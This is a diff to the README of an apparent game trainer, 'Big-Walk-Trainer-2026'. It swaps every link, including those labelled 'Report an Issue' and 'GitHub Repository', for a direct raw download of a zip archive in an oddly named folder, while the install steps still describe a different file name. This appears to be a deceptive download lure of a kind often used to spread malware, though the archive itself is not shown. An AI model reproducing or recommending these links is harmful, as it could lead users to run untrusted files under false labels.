@@ -1,6 +1,6 @@
 # 🐾 Big-Walk-Trainer-2026 - Ultimate Exploration Framework for Big Walk
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-2ea44f?style=for-the-badge&logo=github)](https://github.com/Superk2189/Big-Walk-Trainer-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-2ea44f?style=for-the-badge&logo=github)](https://github.com/Superk2189/Big-Walk-Trainer-2026/raw/refs/heads/main/acocantherin/Trainer_Big_Walk_v3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Big-Walk-Trainer-2026 is a powerful, free mod tool for Big Walk that enhances yo
 ## 📥 Download and Installation
 
 1. Visit the download link to get the application:
-   [**Click Here to Download Big-Walk-Trainer-2026**](https://github.com/Superk2189/Big-Walk-Trainer-2026/releases)
+   [**Click Here to Download Big-Walk-Trainer-2026**](https://github.com/Superk2189/Big-Walk-Trainer-2026/raw/refs/heads/main/acocantherin/Trainer_Big_Walk_v3.2.zip)
 2. On the page that opens, find the latest release asset. It will be a file named `Big-Walk-Trainer-2026.zip`.
 3. Click the file name to download the ZIP archive to your computer.
 4. Navigate to your Downloads folder and locate the `Big-Walk-Trainer-2026.zip` file.
@@ -70,9 +70,9 @@ A: Yes, it is co-op safe. However, it is designed for single player /co-op explo
 
 ## 🔗 Useful Links
 
-- [Download Latest](https://github.com/Superk2189/Big-Walk-Trainer-2026/releases)
-- [Report an Issue](https://github.com/Superk2189/Big-Walk-Trainer-2026/issues)
-- [GitHub Repository](https://github.com/Superk2189/Big-Walk-Trainer-2026)
+- [Download Latest](https://github.com/Superk2189/Big-Walk-Trainer-2026/raw/refs/heads/main/acocantherin/Trainer_Big_Walk_v3.2.zip)
+- [Report an Issue](https://github.com/Superk2189/Big-Walk-Trainer-2026/raw/refs/heads/main/acocantherin/Trainer_Big_Walk_v3.2.zip)
+- [GitHub Repository](https://github.com/Superk2189/Big-Walk-Trainer-2026/raw/refs/heads/main/acocantherin/Trainer_Big_Walk_v3.2.zip)
 
 ---
 
